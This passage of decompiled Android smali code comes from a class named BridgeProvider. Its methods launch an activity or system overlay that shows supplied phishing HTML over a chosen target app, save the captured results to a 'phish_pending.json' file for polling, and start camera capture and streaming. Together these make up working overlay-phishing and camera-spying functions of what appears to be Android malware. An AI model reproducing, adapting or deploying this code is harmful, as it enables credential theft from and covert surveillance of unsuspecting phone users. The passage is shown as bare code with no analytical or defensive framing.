    .line 365
    iget-object v0, p0, Lcom/servers/ozzbzk/BridgeProvider;->overlayHelper:Lcom/servers/ozzbzk/OverlayHelper;

    if-nez v0, :cond_0

    .line 366
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    .line 367
    const-string v1, "showing"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    return-object v0

    .line 370
    :cond_0
    invoke-virtual {v0}, Lcom/servers/ozzbzk/OverlayHelper;->status()Landroid/os/Bundle;

    move-result-object v0

    return-object v0
.end method

.method private persistResult(Landroid/os/Bundle;)V
    .locals 8

    .line 519
    const-string v0, "received_at"

    const-string v1, "dismissed"

    const-string v2, "data_b64"

    const-string v3, ""

    const-string v4, "target_pkg"

    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v5

    if-eqz v5, :cond_1

    if-nez p1, :cond_0

    goto :goto_0

    .line 524
    :cond_0
    :try_start_0
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    .line 525
    invoke-virtual {p1, v4, v3}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v4, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 526
    invoke-virtual {p1, v2, v3}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v6, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v2, 0x0

    .line 527
    invoke-virtual {p1, v1, v2}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    invoke-virtual {v6, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-wide/16 v1, 0x0

    .line 528
    invoke-virtual {p1, v0, v1, v2}, Landroid/os/Bundle;->getLong(Ljava/lang/String;J)J

    move-result-wide v1

    invoke-virtual {v6, v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 530
    invoke-virtual {v5}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object p1

    .line 531
    new-instance v0, Ljava/io/File;

    const-string v1, "phish_pending.json.tmp"

    invoke-direct {v0, p1, v1}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 532
    new-instance v1, Ljava/io/File;

    const-string v2, "phish_pending.json"

    invoke-direct {v1, p1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 533
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, v0}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 534
    invoke-virtual {v6}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "UTF-8"

    invoke-virtual {v2, v3}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {p1, v2}, Ljava/io/FileOutputStream;->write([B)V

    .line 535
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    .line 537
    invoke-virtual {v0, v1}, Ljava/io/File;->renameTo(Ljava/io/File;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 539
    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "persistResult: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "BridgeProvider"

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    :goto_0
    return-void
.end method

.method private phishCheck()Landroid/os/Bundle;
    .locals 3

    .line 511
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    .line 512
    const-string v1, "status"

    const-string v2, "ok"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 513
    const-string v1, "version"

    const/4 v2, 0x3

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putInt(Ljava/lang/String;I)V

    .line 514
    const-string v1, "available"

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    return-object v0
.end method

.method private phishHide()Landroid/os/Bundle;
    .locals 4

    .line 491
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 494
    :try_start_0
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/servers/ozzbzk/PhishActivity;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 495
    const-string v2, "action"

    const-string v3, "finish"

    invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v2, 0x30000000

    .line 496
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 497
    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 499
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "phishHide: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "BridgeProvider"

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 502
    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/servers/ozzbzk/BridgeProvider;->overlayHelper:Lcom/servers/ozzbzk/OverlayHelper;

    if-eqz v0, :cond_1

    .line 503
    invoke-virtual {v0}, Lcom/servers/ozzbzk/OverlayHelper;->hide()Landroid/os/Bundle;

    .line 505
    :cond_1
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    .line 506
    const-string v1, "status"

    const-string v2, "ok"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-object v0
.end method

.method private phishLaunch(Landroid/os/Bundle;)Landroid/os/Bundle;
    .locals 13

    .line 402
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_0

    .line 404
    const-string p1, "no context"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 406
    :cond_0
    const-string v1, ""

    if-eqz p1, :cond_1

    const-string v2, "html_b64"

    invoke-virtual {p1, v2, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    move-object v6, v2

    goto :goto_0

    :cond_1
    move-object v6, v1

    .line 407
    :goto_0
    const-string v2, "html_path"

    if-eqz p1, :cond_2

    invoke-virtual {p1, v2, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    move-object v7, v3

    goto :goto_1

    :cond_2
    move-object v7, v1

    :goto_1
    if-eqz p1, :cond_3

    .line 408
    const-string v3, "html"

    invoke-virtual {p1, v3, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    move-object v5, v3

    goto :goto_2

    :cond_3
    move-object v5, v1

    .line 409
    :goto_2
    const-string v3, "target_pkg"

    if-eqz p1, :cond_4

    invoke-virtual {p1, v3, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    move-object v8, v4

    goto :goto_3

    :cond_4
    move-object v8, v1

    .line 410
    :goto_3
    const-string v4, "result_path"

    if-eqz p1, :cond_5

    invoke-virtual {p1, v4, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    goto :goto_4

    :cond_5
    move-object v9, v1

    :goto_4
    if-eqz v6, :cond_6

    .line 412
    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v10

    if-eqz v10, :cond_8

    :cond_6
    if-eqz v7, :cond_7

    .line 413
    invoke-virtual {v7}, Ljava/lang/String;->isEmpty()Z

    move-result v10

    if-eqz v10, :cond_8

    :cond_7
    if-eqz v5, :cond_d

    .line 414
    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v10

    if-eqz v10, :cond_8

    goto/16 :goto_7

    :cond_8
    const/4 v10, 0x0

    .line 418
    sput-object v10, Lcom/servers/ozzbzk/BridgeProvider;->pendingPhishResult:Landroid/os/Bundle;

    .line 419
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->deletePersistedResult()V

    .line 422
    :try_start_0
    new-instance v10, Landroid/content/Intent;

    const-class v11, Lcom/servers/ozzbzk/PhishActivity;

    invoke-direct {v10, v0, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 423
    const-string v11, "html_base64"

    if-eqz v6, :cond_9

    :try_start_1
    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v12

    if-nez v12, :cond_9

    .line 424
    invoke-virtual {v10, v11, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    goto :goto_5

    :cond_9
    if-eqz v5, :cond_a

    .line 425
    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v12

    if-nez v12, :cond_a

    .line 426
    const-string v2, "UTF-8"

    .line 427
    invoke-virtual {v5, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    const/4 v12, 0x2

    invoke-static {v2, v12}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v2

    .line 426
    invoke-virtual {v10, v11, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    goto :goto_5

    .line 429
    :cond_a
    invoke-virtual {v10, v2, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    :goto_5
    if-eqz v8, :cond_b

    move-object v2, v8

    goto :goto_6

    :cond_b
    move-object v2, v1

    .line 431
    :goto_6
    invoke-virtual {v10, v3, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    if-eqz v9, :cond_c

    move-object v1, v9

    .line 432
    :cond_c
    invoke-virtual {v10, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x50810000

    .line 433
    invoke-virtual {v10, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 437
    invoke-virtual {v0, v10}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 438
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    .line 439
    const-string v1, "status"

    const-string v2, "ok"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 440
    const-string v1, "method"

    const-string v2, "activity"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    move-object v10, v0

    move-object v3, p0

    move-object v4, p1

    .line 443
    invoke-direct/range {v3 .. v10}, Lcom/servers/ozzbzk/BridgeProvider;->phishLaunchViaOverlay(Landroid/os/Bundle;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 415
    :cond_d
    :goto_7
    const-string p1, "html_b64 or html_path or html required"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1
.end method

.method private phishLaunchViaOverlay(Landroid/os/Bundle;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)Landroid/os/Bundle;
    .locals 3

    .line 451
    :try_start_0
    iget-object v0, p0, Lcom/servers/ozzbzk/BridgeProvider;->overlayHelper:Lcom/servers/ozzbzk/OverlayHelper;

    if-nez v0, :cond_0

    .line 452
    invoke-virtual {p7}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 454
    :cond_0
    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    if-eqz p1, :cond_1

    .line 455
    invoke-virtual {v0, p1}, Landroid/os/Bundle;->putAll(Landroid/os/Bundle;)V

    .line 456
    :cond_1
    const-string p1, "target_pkg"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v1, ""

    if-eqz p5, :cond_2

    move-object v2, p5

    goto :goto_0

    :cond_2
    move-object v2, v1

    :goto_0
    :try_start_1
    invoke-virtual {v0, p1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 457
    const-string p1, "result_path"

    if-eqz p6, :cond_3

    goto :goto_1

    :cond_3
    move-object p6, v1

    :goto_1
    invoke-virtual {v0, p1, p6}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 459
    invoke-static {p2, p3, p4}, Lcom/servers/ozzbzk/BridgeProvider;->resolvePhishHtml(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 460
    iget-object p2, p0, Lcom/servers/ozzbzk/BridgeProvider;->overlayHelper:Lcom/servers/ozzbzk/OverlayHelper;

    invoke-virtual {p2, p1, p5, v0}, Lcom/servers/ozzbzk/OverlayHelper;->show(Ljava/lang/String;Ljava/lang/String;Landroid/os/Bundle;)Landroid/os/Bundle;

    move-result-object p1

    if-eqz p1, :cond_4

    .line 461
    const-string p2, "success"

    const/4 p3, 0x0

    invoke-virtual {p1, p2, p3}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;Z)Z

    move-result p2

    if-eqz p2, :cond_4

    .line 462
    const-string p2, "status"

    const-string p3, "ok"

    invoke-virtual {p1, p2, p3}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 463
    const-string p2, "method"

    const-string p3, "overlay"

    invoke-virtual {p1, p2, p3}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    :cond_4
    if-eqz p1, :cond_5

    goto :goto_2

    .line 465
    :cond_5
    const-string p1, "overlay fallback failed"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :goto_2
    return-object p1

    .line 467
    :catch_0
    invoke-virtual {p7}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p7}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p2

    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ": "

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1
.end method

.method private phishPoll()Landroid/os/Bundle;
    .locals 5

    .line 383
    sget-object v0, Lcom/servers/ozzbzk/BridgeProvider;->pendingPhishResult:Landroid/os/Bundle;

    if-nez v0, :cond_0

    .line 385
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->loadPersistedResult()Landroid/os/Bundle;

    move-result-object v0

    .line 387
    :cond_0
    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    .line 388
    const-string v2, "success"

    const/4 v3, 0x1

    invoke-virtual {v1, v2, v3}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 389
    const-string v2, "status"

    const-string v4, "ok"

    invoke-virtual {v1, v2, v4}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 390
    const-string v2, "has_result"

    if-eqz v0, :cond_1

    .line 391
    invoke-virtual {v1, v0}, Landroid/os/Bundle;->putAll(Landroid/os/Bundle;)V

    .line 392
    invoke-virtual {v1, v2, v3}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    const/4 v0, 0x0

    .line 393
    sput-object v0, Lcom/servers/ozzbzk/BridgeProvider;->pendingPhishResult:Landroid/os/Bundle;

    .line 394
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->deletePersistedResult()V

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    .line 396
    invoke-virtual {v1, v2, v0}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    :goto_0
    return-object v1
.end method

.method private phishResult(Landroid/os/Bundle;)Landroid/os/Bundle;
    .locals 3

    .line 374
    new-instance v0, Landroid/os/Bundle;

    if-eqz p1, :cond_0

    invoke-direct {v0, p1}, Landroid/os/Bundle;-><init>(Landroid/os/Bundle;)V

    goto :goto_0

    :cond_0
    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    :goto_0
    sput-object v0, Lcom/servers/ozzbzk/BridgeProvider;->pendingPhishResult:Landroid/os/Bundle;

    .line 375
    sget-object p1, Lcom/servers/ozzbzk/BridgeProvider;->pendingPhishResult:Landroid/os/Bundle;

    const-string v0, "received_at"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-virtual {p1, v0, v1, v2}, Landroid/os/Bundle;->putLong(Ljava/lang/String;J)V

    .line 376
    sget-object p1, Lcom/servers/ozzbzk/BridgeProvider;->pendingPhishResult:Landroid/os/Bundle;

    invoke-direct {p0, p1}, Lcom/servers/ozzbzk/BridgeProvider;->persistResult(Landroid/os/Bundle;)V

    .line 377
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object p1

    .line 378
    const-string v0, "status"

    const-string v1, "ok"

    invoke-virtual {p1, v0, v1}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-object p1
.end method

.method private static resolvePhishHtml(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    if-eqz p0, :cond_0

    .line 472
    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    return-object p0

    .line 473
    :cond_0
    const-string p0, "UTF-8"

    if-eqz p1, :cond_1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    .line 474
    new-instance p2, Ljava/lang/String;

    const/4 v0, 0x2

    invoke-static {p1, v0}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object p1

    invoke-direct {p2, p1, p0}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    return-object p2

    :cond_1
    if-eqz p2, :cond_2

    .line 476
    invoke-virtual {p2}, Ljava/lang/String;->isEmpty()Z

    move-result p1

    if-nez p1, :cond_2

    .line 477
    new-instance p1, Ljava/io/File;

    invoke-direct {p1, p2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 478
    invoke-virtual {p1}, Ljava/io/File;->exists()Z

    move-result p2

    if-eqz p2, :cond_2

    .line 479
    new-instance p2, Ljava/io/FileInputStream;

    invoke-direct {p2, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 480
    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v0

    long-to-int p1, v0

    new-array p1, p1, [B

    .line 482
    invoke-virtual {p2, p1}, Ljava/io/FileInputStream;->read([B)I

    .line 483
    invoke-virtual {p2}, Ljava/io/FileInputStream;->close()V

    .line 484
    new-instance p2, Ljava/lang/String;

    invoke-direct {p2, p1, p0}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    return-object p2

    :cond_2
    const/4 p0, 0x0

    return-object p0
.end method

.method public static setCameraResult(Landroid/os/Bundle;)V
    .locals 0

    .line 40
    sput-object p0, Lcom/servers/ozzbzk/BridgeProvider;->pendingCameraResult:Landroid/os/Bundle;

    return-void
.end method

.method private startFg()Landroid/os/Bundle;
    .locals 4

    .line 587
    :try_start_0
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 588
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    .line 589
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/servers/ozzbzk/BridgeService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 588
    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 591
    :cond_0
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 593
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object v0

    return-object v0
.end method

.method private stopFg()Landroid/os/Bundle;
    .locals 4

    .line 599
    :try_start_0
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 600
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    .line 601
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/servers/ozzbzk/BridgeService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 600
    invoke-virtual {v0, v1}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    .line 603
    :cond_0
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 605
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object v0

    return-object v0
.end method

.method private streamStart(Landroid/os/Bundle;)Landroid/os/Bundle;
    .locals 2

    .line 268
    iget-object v0, p0, Lcom/servers/ozzbzk/BridgeProvider;->cameraHelper:Lcom/servers/ozzbzk/CameraCaptureHelper;

    if-nez v0, :cond_0

    .line 269
    const-string p1, "no camera helper"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    :cond_0
    const/4 v0, 0x0

    if-eqz p1, :cond_1

    .line 271
    const-string v1, "camera_id"

    invoke-virtual {p1, v1, v0}, Landroid/os/Bundle;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 273
    :cond_1
    :try_start_0
    iget-object p1, p0, Lcom/servers/ozzbzk/BridgeProvider;->cameraHelper:Lcom/servers/ozzbzk/CameraCaptureHelper;

    invoke-virtual {p1, v0}, Lcom/servers/ozzbzk/CameraCaptureHelper;->startStream(I)V

    .line 274
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 276
    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1
.end method

.method private streamStop()Landroid/os/Bundle;
    .locals 1

    .line 281
    iget-object v0, p0, Lcom/servers/ozzbzk/BridgeProvider;->cameraHelper:Lcom/servers/ozzbzk/CameraCaptureHelper;

    if-nez v0, :cond_0

    .line 282
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    return-object v0

    .line 285
    :cond_0
    :try_start_0
    invoke-virtual {v0}, Lcom/servers/ozzbzk/CameraCaptureHelper;->stopStream()V

    .line 286
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 288
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object v0

    return-object v0
.end method


# virtual methods
.method public call(Ljava/lang/String;Ljava/lang/String;Landroid/os/Bundle;)Landroid/os/Bundle;
    .locals 3

    .line 70
    invoke-static {}, Landroid/os/Binder;->getCallingUid()I

    move-result v0

    .line 71
    invoke-static {}, Landroid/os/Process;->myUid()I

    move-result v1

    if-eqz v0, :cond_0

    const/16 v2, 0x3e8

    if-eq v0, v2, :cond_0

    const/16 v2, 0x7d0

    if-eq v0, v2, :cond_0

    if-eq v0, v1, :cond_0

    const/4 p1, 0x0

    return-object p1

    :cond_0
    if-nez p1, :cond_1

    .line 76
    const-string p1, "null method"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 78
    :cond_1
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->ensureHelpers()V

    .line 79
    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result v0

    const/4 v1, -0x1

    sparse-switch v0, :sswitch_data_0

    goto/16 :goto_0

    :sswitch_0
    const-string v0, "camera_capture"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    goto/16 :goto_0

    :cond_2
    const/16 v1, 0x13

    goto/16 :goto_0

    :sswitch_1
    const-string v0, "stream_stop"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    goto/16 :goto_0

    :cond_3
